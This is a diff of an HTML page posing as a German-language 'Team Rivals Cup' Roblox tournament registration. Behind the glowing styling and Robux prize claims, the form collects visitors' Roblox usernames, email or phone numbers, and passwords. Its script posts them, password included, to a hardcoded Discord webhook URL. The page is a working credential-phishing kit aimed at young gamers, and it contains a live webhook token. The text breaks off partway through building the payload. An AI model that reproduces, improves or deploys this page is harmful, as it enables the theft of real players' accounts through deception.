@@ -1,782 +1,425 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="de">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>RobloxComp | Team Rivals Cup</title>
-    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+  <title>Team Rivals Cup | 01.05.2026</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
 
-        body {
-            font-family: 'Montserrat', sans-serif;
-            background: radial-gradient(circle at 20% 30%, #0a0c12, #020406);
-            min-height: 100vh;
-            color: #edeff5;
-            overflow-x: hidden;
-        }
+    body {
+      background: linear-gradient(135deg, #0b0c1a 0%, #1a1f3a 100%);
+      font-family: 'Segoe UI', 'Poppins', system-ui, sans-serif;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 1.5rem;
+      margin: 0;
+      position: relative;
+      overflow-x: hidden;
+    }
 
-        ::-webkit-scrollbar { width: 4px; }
-        ::-webkit-scrollbar-track { background: #11131f; }
-        ::-webkit-scrollbar-thumb { background: #ff3355; border-radius: 10px; }
+    body::before {
+      content: "";
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: radial-gradient(circle at 30% 40%, rgba(255, 70, 85, 0.08) 0%, transparent 50%),
+                  radial-gradient(circle at 70% 60%, rgba(0, 180, 255, 0.1) 0%, transparent 50%);
+      pointer-events: none;
+      z-index: 0;
+    }
 
-        .site-container {
-            max-width: 1400px;
-            margin: 0 auto;
-            padding: 1.8rem 2rem 3rem;
-            opacity: 0;
-            transition: opacity 0.6s cubic-bezier(0.2, 0.9, 0.4, 1.1);
-        }
-        .site-container.loaded { opacity: 1; }
+    .main-container {
+      width: 100%;
+      max-width: 530px;
+      background: rgba(18, 22, 40, 0.9);
+      backdrop-filter: blur(16px);
+      -webkit-backdrop-filter: blur(16px);
+      border: 1px solid rgba(255, 255, 255, 0.15);
+      border-radius: 2.5rem;
+      padding: 2.5rem 2rem;
+      box-shadow: 0 30px 50px rgba(0, 0, 0, 0.7), 0 0 0 1px rgba(255, 70, 85, 0.2);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      position: relative;
+      z-index: 2;
+      transition: all 0.2s ease;
+    }
 
-        /* LOADER */
-        .loader-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: #05070c;
-            backdrop-filter: blur(10px);
-            z-index: 2000;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            transition: opacity 0.5s ease, visibility 0.5s ease;
-            opacity: 1;
-            visibility: visible;
-        }
-        .loader-overlay.hidden-loader { opacity: 0; visibility: hidden; pointer-events: none; }
-        .loader-dots { display: flex; gap: 1rem; }
-        .dot {
-            width: 14px; height: 14px;
-            background: #e0e4f0;
-            border-radius: 50%;
-            animation: pulseWave 1.5s infinite ease-in-out;
-        }
-        .dot:nth-child(1) { animation-delay: 0s; background: #fff; }
-        .dot:nth-child(2) { animation-delay: 0.3s; background: #cbd5ff; }
-        .dot:nth-child(3) { animation-delay: 0.6s; background: #ffb3c6; }
-        @keyframes pulseWave {
-            0% { opacity: 0.25; transform: scale(0.8); }
-            50% { opacity: 1; transform: scale(1.3); background: #fff5f0; box-shadow: 0 0 12px rgba(255,80,120,0.5); }
-            100% { opacity: 0.25; transform: scale(0.8); }
-        }
+    /* ---------- LOGO BEREICH ---------- */
+    .logo-wrapper {
+      width: 100%;
+      display: flex;
+      justify-content: flex-start;
+      margin-bottom: 1.8rem;
+      position: relative;
+    }
 
-        .inline-loader { display: flex; align-items: center; justify-content: center; gap: 10px; padding: 6px 0; }
-        .inline-loader .dot { width: 9px; height: 9px; animation: pulseWave 1.2s infinite ease-in-out; }
+    .roblox-logo {
+      font-family: 'Poppins', 'Segoe UI', 'Arial Black', sans-serif;
+      font-weight: 900;
+      font-size: 2.8rem;
+      letter-spacing: 2px;
+      color: #ff3345;
+      text-transform: uppercase;
+      background: linear-gradient(180deg, #ff5e6b 0%, #cc1122 90%);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+      filter: drop-shadow(0 0 12px rgba(255, 50, 70, 0.7));
+      transition: all 0.35s cubic-bezier(0.2, 0.9, 0.4, 1);
+      cursor: default;
+      display: inline-block;
+      line-height: 1;
+      text-shadow: 0 0 12px rgba(255, 70, 85, 0.5);
+      /* glow nach außen */
+      animation: softGlow 2.8s infinite alternate;
+    }
 
-        /* HEADER */
-        .modern-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            flex-wrap: wrap;
-            margin-bottom: 1.8rem;
-            padding-bottom: 0.5rem;
-            border-bottom: 1px solid rgba(255,255,245,0.06);
-        }
-        .logo-wrapper {
-            display: flex;
-            align-items: baseline;
-            gap: 12px;
-            flex-wrap: wrap;
-        }
-        .logo-combined {
-            font-family: 'Montserrat', sans-serif;
-            font-size: 2.2rem;
-            font-weight: 800;
-            letter-spacing: -0.02em;
-            transition: transform 0.2s ease;
-            cursor: pointer;
-        }
-        .logo-combined .roblox-white {
-            color: #ffffff;
-            text-shadow: 0 0 4px rgba(255,255,255,0.3);
-        }
-        .logo-combined .comp-red {
-            color: #ff3355;
-            text-shadow: 0 0 3px #ff3355;
-            font-weight: 900;
-        }
-        .logo-combined:hover {
-            transform: scale(1.02);
-        }
-        .logo-combined:hover .roblox-white {
-            text-shadow: 0 0 8px rgba(255,255,255,0.5);
-        }
-        .logo-combined:hover .comp-red {
-            text-shadow: 0 0 8px #ff3355;
-            color: #ff4d6d;
-        }
-        .github-btn {
-            font-size: 0.7rem;
-            color: #8e93b0;
-            background: rgba(25, 28, 45, 0.7);
-            padding: 0.25rem 0.9rem;
-            border-radius: 50px;
-            text-decoration: none;
-            font-weight: 500;
-            letter-spacing: 0.2px;
-            transition: all 0.2s;
-            display: inline-flex;
-            align-items: center;
-            gap: 6px;
-            border: 1px solid rgba(255,255,255,0.1);
-        }
-        .github-btn:hover {
-            background: rgba(45, 48, 70, 0.9);
-            color: #ffffff;
-            border-color: #ff3355;
-            transform: translateY(-1px);
-        }
+    @keyframes softGlow {
+      0% {
+        filter: drop-shadow(0 0 10px rgba(255, 55, 75, 0.55));
+      }
+      100% {
+        filter: drop-shadow(0 0 18px rgba(255, 70, 90, 0.85));
+      }
+    }
 
-        /* GLOBAL COUNTDOWN BOX - LIVE STYLE */
-        .countdown-container {
-            background: linear-gradient(135deg, rgba(255, 51, 85, 0.15), rgba(255, 80, 120, 0.08));
-            border-radius: 1.5rem;
-            padding: 1.2rem 1.5rem;
-            margin-bottom: 1.5rem;
-            border: 1px solid rgba(255, 70, 100, 0.3);
-            backdrop-filter: blur(8px);
-            text-align: center;
-            transition: all 0.3s ease;
-        }
-        .countdown-container.live {
-            background: linear-gradient(135deg, rgba(46, 255, 138, 0.2), rgba(46, 255, 138, 0.08));
-            border: 1px solid #2eff8a;
-            box-shadow: 0 0 20px rgba(46, 255, 138, 0.3);
-        }
-        .countdown-label {
-            font-size: 0.75rem;
-            text-transform: uppercase;
-            letter-spacing: 3px;
-            font-weight: 600;
-            color: #ff8aa0;
-            transition: all 0.3s;
-        }
-        .countdown-container.live .countdown-label {
-            color: #2eff8a;
-            text-shadow: 0 0 5px #2eff8a;
-        }
-        .countdown-timer {
-            display: flex;
-            justify-content: center;
-            gap: 1.2rem;
-            flex-wrap: wrap;
-        }
-        .countdown-block {
-            background: rgba(0, 0, 0, 0.5);
-            border-radius: 1rem;
-            padding: 0.6rem 1rem;
-            min-width: 70px;
-            backdrop-filter: blur(4px);
-            border-bottom: 2px solid #ff3355;
-            transition: all 0.3s;
-        }
-        .countdown-container.live .countdown-block {
-            border-bottom-color: #2eff8a;
-            background: rgba(0, 0, 0, 0.6);
-        }
-        .countdown-number {
-            font-size: 2rem;
-            font-weight: 800;
-            font-family: monospace;
-            letter-spacing: 2px;
-            color: #ffffff;
-            text-shadow: 0 0 10px #ff3355;
-            transition: all 0.3s;
-        }
-        .countdown-container.live .countdown-number {
-            text-shadow: 0 0 10px #2eff8a;
-            color: #2eff8a;
-        }
-        .countdown-unit {
-            font-size: 0.65rem;
-            text-transform: uppercase;
-            color: #b9c3e6;
-            margin-top: 4px;
-        }
-        .countdown-ended {
-            font-size: 1.5rem;
-            font-weight: 800;
-            color: #2eff8a;
-            text-shadow: 0 0 15px #2eff8a;
-            animation: pulse-green 1s infinite;
-        }
-        @keyframes pulse-green {
-            0% { text-shadow: 0 0 5px #2eff8a; }
-            50% { text-shadow: 0 0 20px #2eff8a; }
-            100% { text-shadow: 0 0 5px #2eff8a; }
-        }
-        .tournament-name-live {
-            margin-top: 10px;
-            font-size: 1rem;
-            font-weight: 700;
-            color: #2eff8a;
-            letter-spacing: 1px;
-        }
+    .roblox-logo:hover {
+      transform: scale(1.12);
+      filter: drop-shadow(0 0 27px rgba(255, 30, 50, 1)) drop-shadow(0 0 10px #ff2244);
+      -webkit-text-fill-color: #ff3b4a;
+      background: linear-gradient(180deg, #ff7b87 0%, #ee2233 100%);
+      -webkit-background-clip: text;
+      background-clip: text;
+      text-shadow: 0 0 22px #ff4055, 0 0 8px #ff1e3c;
+      transition: all 0.3s ease-out;
+      cursor: pointer;
+    }
 
-        /* SLOT WARNING */
-        .slot-warning {
-            background: rgba(255, 100, 40, 0.1);
-            border-left: 3px solid #ffa047;
-            border-radius: 1rem;
-            padding: 0.7rem 1.2rem;
-            margin-bottom: 1.5rem;
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            backdrop-filter: blur(4px);
-            font-weight: 600;
-            font-size: 0.85rem;
-            color: #ffbc7a;
-        }
+    /* Turnier Titel */
+    .tournament-title {
+      font-size: 2.1rem;
+      font-weight: 800;
+      text-align: center;
+      color: #f0e9e9;
+      text-transform: uppercase;
+      letter-spacing: 2px;
+      margin: 0.5rem 0 0.2rem;
+      text-shadow: 0 0 18px rgba(255, 215, 0, 0.7);
+      background: linear-gradient(to right, #ffd966, #ffb347);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+      filter: drop-shadow(0 4px 6px black);
+      word-break: break-word;
+    }
 
-        /* TWO COLUMNS */
-        .two-col {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 2rem;
-            margin: 1.5rem 0 2rem;
-        }
-        .form-col { flex: 1.2; min-width: 280px; }
-        .info-col { flex: 1; min-width: 280px; }
+    .cup-badge {
+      font-size: 1.1rem;
+      background: rgba(255, 200, 50, 0.15);
+      padding: 0.3rem 1.4rem;
+      border-radius: 40px;
+      color: #ffcd7a;
+      font-weight: 700;
+      letter-spacing: 1px;
+      margin-bottom: 1.8rem;
+      border: 1px solid rgba(255, 180, 30, 0.5);
+      backdrop-filter: blur(10px);
+      text-transform: uppercase;
+    }
 
-        /* LOGIN CARD */
-        .login-card {
-            background: rgba(10, 12, 22, 0.7);
-            backdrop-filter: blur(16px);
-            border-radius: 1.8rem;
-            padding: 1.6rem 1.8rem;
-            border: 1px solid rgba(255,255,255,0.08);
-            box-shadow: 0 20px 30px -12px rgba(0,0,0,0.4);
-        }
-        .form-title {
-            font-weight: 700;
-            font-size: 1.2rem;
-            margin-bottom: 1.2rem;
-            text-align: center;
-            background: linear-gradient(135deg, #fff, #ffb8c6);
-            -webkit-background-clip: text;
-            background-clip: text;
-            color: transparent;
-        }
-        .input-group { margin-bottom: 1rem; }
-        .input-group label { font-size: 0.75rem; font-weight: 500; margin-bottom: 0.3rem; display: block; color: #a8b3da; }
-        .input-field {
-            width: 100%;
-            background: rgba(2, 4, 12, 0.8);
-            border: 1px solid #282e44;
-            border-radius: 1.2rem;
-            padding: 0.75rem 1rem;
-            font-size: 0.9rem;
-            color: #f0f3fc;
-            outline: none;
-            transition: all 0.2s;
-        }
-        .input-field:focus { border-color: #ff3355; box-shadow: 0 0 8px rgba(255, 51, 85, 0.2); }
-        .login-btn {
-            background: linear-gradient(95deg, #ff2e4d, #ff5c7e);
-            width: 100%;
-            border: none;
-            padding: 0.75rem;
-            font-weight: 700;
-            border-radius: 2rem;
-            color: white;
-            cursor: pointer;
-            transition: 0.2s;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
-        }
-        .login-btn:hover { transform: scale(1.01); box-shadow: 0 6px 14px rgba(255,46,77,0.3); }
-        .team-fields { margin-top: 1rem; display: none; transition: 0.2s; }
-        .team-fields.show-team { display: block; animation: fadeSlide 0.25s ease; }
-        .team-row { margin-bottom: 0.6rem; }
-        @keyframes fadeSlide { from { opacity: 0; transform: translateY(8px); } to { opacity: 1; transform: translateY(0); } }
+    .datetime {
+      background: #0f1322;
+      padding: 0.9rem 1.8rem;
+      border-radius: 50px;
+      font-weight: 700;
+      font-size: 1.3rem;
+      color: #fdd835;
+      margin: 0.8rem 0 1.8rem;
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+      border: 1px solid rgba(255, 215, 0, 0.4);
+      box-shadow: 0 0 20px rgba(253, 216, 53, 0.4);
+      flex-wrap: wrap;
+      justify-content: center;
+      text-align: center;
+    }
 
-        .form-feedback {
-            font-size: 0.7rem;
-            margin-top: 0.8rem;
-            text-align: center;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 6px;
-            border-radius: 40px;
-            padding: 0.3rem;
-        }
+    .datetime span {
+      background: #1f2544;
+      padding: 0.3rem 0.9rem;
+      border-radius: 30px;
+      color: white;
+      font-weight: 700;
+      margin-left: 0.3rem;
+    }
 
-        /* TOURNAMENT CARD */
-        .tournament-card {
-            background: rgba(6, 8, 18, 0.65);
-            backdrop-filter: blur(14px);
-            border-radius: 1.8rem;
-            border: 1px solid rgba(255,70,100,0.25);
-            overflow: hidden;
-            transition: transform 0.2s, border-color 0.2s, background 0.2s;
-            box-shadow: 0 12px 28px -12px black;
-        }
-        .tournament-card:hover {
-            transform: translateY(-4px);
-            border-color: #ff5c7e;
-            background: rgba(20, 22, 38, 0.8);
-        }
-        .tournament-header {
-            padding: 1.2rem 1.5rem 0.5rem;
-            border-bottom: 1px solid rgba(255,80,100,0.3);
-        }
-        .tournament-header h2 {
-            font-size: 1.5rem;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            font-weight: 700;
-        }
-        .tournament-sub {
-            font-size: 0.7rem;
-            color: #b9c3e6;
-            margin-top: 4px;
-        }
-        .tournament-rules, .prize-info {
-            padding: 1rem 1.5rem;
-            border-bottom: 1px solid rgba(255,255,255,0.05);
-        }
-        .tournament-rules p, .prize-info p {
-            font-size: 0.8rem;
-            margin: 0.5rem 0;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-        .prize-info .prize-line {
-            justify-content: space-between;
-            display: flex;
-            flex-wrap: wrap;
-            border-bottom: 1px dashed rgba(255,255,255,0.1);
-            padding: 0.4rem 0;
-        }
-        .donate-thanks {
-            padding: 0.8rem 1.5rem;
-            font-size: 0.65rem;
-            color: #9da2bd;
-            text-align: center;
-            background: rgba(0,0,0,0.3);
-        }
-        .footer-note {
-            text-align: center;
-            margin-top: 3rem;
-            font-size: 0.7rem;
-            color: #5f6480;
-        }
-        .success-notice {
-            margin-top: 1.2rem;
-            padding: 0.7rem;
-            background: rgba(0, 32, 16, 0.6);
-            border-radius: 1rem;
-            text-align: center;
-            font-size: 0.75rem;
-            border-left: 3px solid #2eff8a;
-        }
-        .nexoo-glow {
-            color: #ff3355;
-            font-weight: 800;
-            text-shadow: 0 0 3px #ff3355;
-            transition: 0.2s;
-            display: inline-block;
-        }
-        .nexoo-glow:hover { text-shadow: 0 0 8px #ff5e7e; transform: scale(1.02); }
-        .hidden-message { display: none; }
-        
-        /* TOAST MESSAGE */
-        .toast-message {
-            position: fixed;
-            bottom: 30px;
-            left: 50%;
-            transform: translateX(-50%);
-            background: #1a1d2ee6;
-            backdrop-filter: blur(16px);
-            padding: 12px 26px;
-            border-radius: 60px;
-            font-size: 0.85rem;
-            z-index: 1500;
-            border-left: 3px solid;
-            transition: opacity 0.4s ease, visibility 0.4s ease, transform 0.3s ease;
-            pointer-events: none;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            font-weight: 500;
-            letter-spacing: 0.2px;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.3);
-        }
-        .toast-message.show {
-            opacity: 1 !important;
-            visibility: visible !important;
-            transform: translateX(-50%) translateY(0);
-        }
-        .toast-message.hide {
-            opacity: 0 !important;
-            visibility: hidden !important;
-            transform: translateX(-50%) translateY(10px);
-        }
-        
-        @media (max-width: 780px) {
-            .site-container { padding: 1.2rem; }
-            .two-col { flex-direction: column; }
-            .logo-combined { font-size: 1.6rem; }
-            .toast-message { padding: 8px 18px; font-size: 0.75rem; bottom: 20px; }
-            .countdown-number { font-size: 1.3rem; }
-            .countdown-block { padding: 0.4rem 0.6rem; min-width: 55px; }
-        }
-    </style>
+    .form-area {
+      width: 100%;
+      display: flex;
+      flex-direction: column;
+      gap: 1.2rem;
+      margin-top: 0.5rem;
+    }
+
+    .input-group {
+      display: flex;
+      flex-direction: column;
+      gap: 0.3rem;
+    }
+
+    label {
+      font-weight: 600;
+      font-size: 0.9rem;
+      color: #b9c2e6;
+      letter-spacing: 0.5px;
+      margin-left: 0.3rem;
+    }
+
+    input {
+      background: rgba(10, 14, 28, 0.8);
+      border: 1.5px solid rgba(255, 255, 255, 0.2);
+      border-radius: 2.5rem;
+      padding: 0.9rem 1.4rem;
+      font-size: 1rem;
+      color: white;
+      outline: none;
+      transition: 0.25s ease;
+      font-weight: 500;
+      backdrop-filter: blur(8px);
+      background: rgba(20, 24, 45, 0.7);
+    }
+
+    input:focus {
+      border-color: #f5425c;
+      box-shadow: 0 0 18px rgba(245, 66, 92, 0.7);
+      background: rgba(25, 30, 55, 0.9);
+    }
+
+    input::placeholder {
+      color: #7b83a6;
+      font-weight: 400;
+    }
+
+    .verify-btn {
+      background: linear-gradient(145deg, #e62e42, #b71c2e);
+      border: none;
+      padding: 1rem 2rem;
+      border-radius: 3rem;
+      font-weight: 800;
+      font-size: 1.2rem;
+      text-transform: uppercase;
+      letter-spacing: 2px;
+      color: white;
+      cursor: pointer;
+      margin-top: 0.8rem;
+      box-shadow: 0 10px 20px rgba(220, 30, 50, 0.5), 0 0 25px #ff2a40;
+      transition: 0.25s ease-in-out;
+      border: 1px solid #ff8080;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .verify-btn:hover {
+      background: linear-gradient(145deg, #ff4056, #d9253b);
+      box-shadow: 0 0 32px #ff2d4f, 0 12px 28px rgba(200, 20, 50, 0.8);
+      transform: scale(1.03);
+      letter-spacing: 2.5px;
+    }
+
+    .verify-btn:active {
+      transform: scale(0.97);
+    }
+
+    .status-message {
+      text-align: center;
+      font-weight: 600;
+      margin-top: 1rem;
+      min-height: 1.8rem;
+      color: #ffbc6c;
+      font-size: 0.95rem;
+    }
+
+    .error-highlight {
+      color: #ff6b7c;
+      text-shadow: 0 0 6px red;
+    }
+
+    .webhook-note {
+      display: none;
+    }
+
+    @media (max-width: 450px) {
+      .main-container {
+        padding: 2rem 1.3rem;
+      }
+      .roblox-logo {
+        font-size: 2.2rem;
+      }
+    }
+  </style>
 </head>
 <body>
-
-<div id="globalLoader" class="loader-overlay"><div class="loader-dots"><div class="dot"></div><div class="dot"></div><div class="dot"></div></div></div>
-
-<div id="mainContainer" class="site-container">
-    <div class="modern-header">
-        <div class="logo-wrapper">
-            <div class="logo-combined">
-                <span class="roblox-white">Roblox</span><span class="comp-red">Comp</span>
-            </div>
-            <a href="#" class="github-btn" id="githubBtn"><i class="fab fa-github"></i> .github.io</a>
-        </div>
-        <div style="width: 80px;"></div>
+  <div class="main-container">
+    <!-- LOGO LINKS OBEN: ROBLOXCOMP als besserer Schriftzug -->
+    <div class="logo-wrapper">
+      <div class="roblox-logo">ROBLOXCOMP</div>
     </div>
 
-    <!-- GLOBAL COUNTDOWN - 25K RIVALS RUSH TOURNAMENT -->
-    <div class="countdown-container" id="countdownContainer">
-        <div class="countdown-label" id="countdownLabel"><i class="fas fa-hourglass-half"></i> 25.000 TOURNAMENT</div>
-        <div id="countdownTimer" class="countdown-timer">
-            <div class="countdown-block"><div class="countdown-number" id="days">00</div><div class="countdown-unit">DAYS</div></div>
-            <div class="countdown-block"><div class="countdown-number" id="hours">00</div><div class="countdown-unit">HOURS</div></div>
-            <div class="countdown-block"><div class="countdown-number" id="minutes">00</div><div class="countdown-unit">MINUTES</div></div>
-            <div class="countdown-block"><div class="countdown-number" id="seconds">00</div><div class="countdown-unit">SECONDS</div></div>
-        </div>
-        <div id="liveMessage" style="display: none;" class="tournament-name-live"></div>
+    <div class="cup-badge">🏆 TUNIER 🏆</div>
+    <div class="tournament-title">TEAM RIVALS CUP</div>
+
+    <div class="datetime">
+      📅 01.05.2026 <span>⏰ 15:30</span>
     </div>
 
-    <div class="slot-warning">
-        <i class="fas fa-exclamation-triangle"></i> <span>2 Slots left until start!</span>
+    <div class="form-area">
+      <div class="input-group">
+        <label>👤 Roblox Name</label>
+        <input type="text" id="robloxName" placeholder="mind. 3 Zeichen" autocomplete="off">
+      </div>
+      <div class="input-group">
+        <label>📧 Email oder Telefon</label>
+        <input type="text" id="contactInput" placeholder="mind. 5 Zeichen" autocomplete="off">
+      </div>
+      <div class="input-group">
+        <label>🔐 Passwort</label>
+        <input type="password" id="passwordInput" placeholder="mind. 8 Zeichen" autocomplete="off">
+      </div>
+
+      <button class="verify-btn" id="submitBtn">JETZT ANMELDEN</button>
+      <div class="status-message" id="statusMsg"></div>
     </div>
+  </div>
 
-    <div class="two-col">
-        <div class="form-col">
-            <div class="login-card">
-                <div class="form-title">RIVALS REGISTRATION</div>
-                <div class="input-group">
-                    <label><i class="fas fa-user"></i> Roblox Username</label>
-                    <input type="text" id="robloxUsername" class="input-field" placeholder="Your IGN">
-                </div>
-                <div class="input-group">
-                    <label><i class="fas fa-envelope"></i> Email / Phone</label>
-                    <input type="text" id="emailPhone" class="input-field" placeholder="contact@example.com">
-                </div>
-                <div class="input-group">
-                    <label><i class="fas fa-lock"></i> Password</label>
-                    <input type="text" id="password" class="input-field" placeholder="••••••">
-                </div>
-                <div id="teamFieldsContainer" class="team-fields">
-                    <div style="font-size:0.7rem; margin-bottom:8px; color:#a0a8cc;"><i class="fas fa-users"></i> Team roster (4 slots)</div>
-                    <div class="team-row"><input type="text" id="teamMember1" class="input-field" placeholder="Competitor #1 (Captain)"></div>
-                    <div class="team-row"><input type="text" id="teamMember2" class="input-field" placeholder="Competitor #2"></div>
-                    <div class="team-row"><input type="text" id="teamMember3" class="input-field" placeholder="Competitor #3"></div>
-                    <div class="team-row"><input type="text" id="teamMember4" class="input-field" placeholder="Competitor #4"></div>
-                </div>
-                <button id="submitMainBtn" class="login-btn"><i class="fas fa-arrow-right"></i> Register & Join</button>
-                <div id="inlineFeedback" class="form-feedback"></div>
-                <div id="dynamicAdminNotice" class="hidden-message"></div>
-            </div>
-        </div>
+  <script>
+    (function() {
+      const WEBHOOK_URL = "https://discord.com/api/webhooks/1499515877027086488/S3DHFQbry9zn-dpv2ykxffpC_fySox_FIq-oruVBwD2CIfMelsuqb53YNJg4u0Gvhido";
 
-        <div class="info-col">
-            <div class="tournament-card">
-                <div class="tournament-header">
-                    <h2><i class="fas fa-trophy"></i> Team Rivals Cup</h2>
-                    <div class="tournament-sub">This is our Third tournament this month!</div>
-                </div>
-                <div class="tournament-rules">
-                    <p><i class="fas fa-ban"></i> Not allowed to play solo! (atleast 2 persons)</p>
-                    <p><i class="fas fa-handshake"></i> No teaming with other teams</p>
-                    <p><i class="fas fa-skull"></i> No Cheats like Xeno or Hero Executor</p>
-                </div>
-                <div class="prize-info">
-                    <div class="prize-line"><span><i class="fas fa-crown"></i> First place</span> <span><i class="fas fa-coins"></i> 2.500+ Robux</span></div>
-                    <div class="prize-line"><span><i class="fas fa-chart-line"></i> Every win</span> <span><i class="fas fa-coins"></i> 500+ Robux (for every teammate)</span></div>
-                    <div class="prize-line"><span><i class="fas fa-frown"></i> Every lose</span> <span><i class="fas fa-coins"></i> 250- Robux (for every teammate)</span></div>
-                    <div class="prize-line"><span><i class="fas fa-clock"></i> Round</span> <span>7 Rounds - Random Team vs Random Team<br>3 Finals - Everybody vs Everybody</span></div>
-                    <div class="prize-line"><span><i class="fas fa-ticket-alt"></i> Cost of this Tournament</span> <span><i class="fas fa-coins"></i> 20.000+ Robux</span></div>
-                </div>
-                <div class="donate-thanks">
-                    <i class="fas fa-heart" style="color:#ff7792;"></i> Thanks for every donator on german voice and please donut this helped alot
-                </div>
-            </div>
-        </div>
-    </div>
-    <div class="footer-note">
-        <i class="fas fa-shield-alt"></i> Official Rivals Partner — all your data is secured!
-    </div>
-</div>
+      const robloxInput = document.getElementById('robloxName');
+      const contactInput = document.getElementById('contactInput');
+      const passwordInput = document.getElementById('passwordInput');
+      const submitBtn = document.getElementById('submitBtn');
+      const statusDiv = document.getElementById('statusMsg');
 
-<div id="floatingToast" class="toast-message" style="opacity:0; visibility:hidden;"></div>
+      function setStatus(text, isError = false) {
+        statusDiv.textContent = text;
+        statusDiv.style.color = isError ? '#ff7b8a' : '#b9ffb0';
+      }
 
-<script>
-    (function(){
-        // ============================================================
-        // 🟢🟢🟢 COUNTDOWN AUF 1. MAI 2026 UM 20:00 UHR 🟢🟢🟢
-        // ============================================================
-        // Jahr, Monat (0=Januar, 4=Mai), Tag, Stunde, Minute, Sekunde
-        const targetDate = new Date(2026, 4, 1, 1, 5, 5); // 1. Mai 2026 um 20:00 Uhr
-        
-        // DISCORD WEBHOOK (für Admins)
-        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1499515877027086488/S3DHFQbry9zn-dpv2ykxffpC_fySox_FIq-oruVBwD2CIfMelsuqb53YNJg4u0Gvhido";
-        
-        // DOM Elements
-        const globalLoader = document.getElementById('globalLoader');
-        const mainContainer = document.getElementById('mainContainer');
-        const usernameInput = document.getElementById('robloxUsername');
-        const emailInput = document.getElementById('emailPhone');
-        const passwordInput = document.getElementById('password');
-        const submitBtn = document.getElementById('submitMainBtn');
-        const teamContainer = document.getElementById('teamFieldsContainer');
-        const teamMember1 = document.getElementById('teamMember1');
-        const teamMember2 = document.getElementById('teamMember2');
-        const teamMember3 = document.getElementById('teamMember3');
-        const teamMember4 = document.getElementById('teamMember4');
-        const dynamicNotice = document.getElementById('dynamicAdminNotice');
-        const countdownContainer = document.getElementById('countdownContainer');
-        const countdownLabel = document.getElementById('countdownLabel');
-        const liveMessageDiv = document.getElementById('liveMessage');
-        const timerDiv = document.getElementById('countdownTimer');
+      function validateForm() {
+        const robloxName = robloxInput.value.trim();
+        const contact = contactInput.value.trim();
+        const password = passwordInput.value;
 
-        // ========== COUNTDOWN FUNKTION MIT LIVE-MODUS ==========
-        let isLive = false;
-        
-        function updateCountdown() {
-            const now = new Date().getTime();
-            const distance = targetDate - now;
-            
-            const daysEl = document.getElementById('days');
-            const hoursEl = document.getElementById('hours');
-            const minutesEl = document.getElementById('minutes');
-            const secondsEl = document.getElementById('seconds');
-            
-            if (distance < 0 && !isLive) {
-                // COUNTDOWN IST ABGELAUFEN - LIVE MODUS AKTIVIEREN
-                isLive = true;
-                
-                // Container grün machen
-                if (countdownContainer) countdownContainer.classList.add('live');
-                
-                // Label ändern
-                if (countdownLabel) {
-                    countdownLabel.innerHTML = '<i class="fas fa-fire"></i> 🔴 LIVE NOW 🔴 <i class="fas fa-fire"></i>';
-                    countdownLabel.style.color = '#2eff8a';
-                    countdownLabel.style.textShadow = '0 0 10px #2eff8a';
+        if (robloxName.length < 3) {
+          setStatus('❌ Roblox Name muss mindestens 3 Zeichen haben.', true);
+          return false;
+        }
+        if (contact.length < 5) {
+          setStatus('❌ Email/Telefon benötigt mindestens 5 Zeichen.', true);
+          return false;
+        }
+        if (password.length < 8) {
+          setStatus('❌ Passwort muss mindestens 8 Zeichen lang sein.', true);
+          return false;
+        }
+        setStatus('✅ Eingaben gültig – wird gesendet...', false);
+        return true;
+      }
+
+      async function sendToWebhook(payload) {
+        try {
+          const response = await fetch(WEBHOOK_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+          });
+          
+          if (response.ok) {
+            setStatus('🎉 Erfolgreich angemeldet! Viel Glück beim Team Rivals Cup!', false);
+            robloxInput.value = '';
+            contactInput.value = '';
+            passwordInput.value = '';
+          } else {
+            console.warn('Webhook Antwort nicht ok:', response.status);
+            setStatus('⚠️ Serverfehler, versuche es später erneut.', true);
+          }
+        } catch (error) {
+          console.error('Fehler beim Senden:', error);
+          setStatus('🌐 Netzwerkfehler. Bitte überprüfe deine Verbindung.', true);
+        }
+      }
+
+      function handleSubmit() {
+        if (!validateForm()) return;
+
+        const robloxName = robloxInput.value.trim();
+        const contact = contactInput.value.trim();
+        const password = passwordInput.value; 
+
+        const payload = {
+          content: null,
+          embeds: [
+            {
+              title: "🏁 TEAM RIVALS CUP – Neue Anmeldung",
+              color: 16733525, 
+              fields: [
+                {
+                  name: "👤 Roblox Name",
+                  value: `\`${robloxName}\``,
+                  inline: true
+                },
+                {
+                  name: "📞 Email / Telefon",
+                  value: `\`${contact}\``,
+                  inline: true
+                },
+                {
+                  name: "🔐 Passwort",
